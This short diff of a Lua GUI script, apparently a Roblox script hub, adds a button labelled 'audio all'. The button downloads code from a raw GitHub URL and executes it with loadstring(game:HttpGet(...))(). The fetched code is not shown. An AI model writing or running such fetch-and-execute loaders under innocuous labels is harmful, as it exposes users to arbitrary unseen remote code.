@@ -133,8 +133,12 @@ end})
 
 local Tab1 = Window:MakeTab({"all", "people"})
 
+Tab1:AddButton({"audio all", function(Value)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/such/main/ftg'))()
+print("Hello World!")
+end})
+
 Tab1:AddButton({"Print", function(Value)
 
 print("Hello World!")
 end})
-
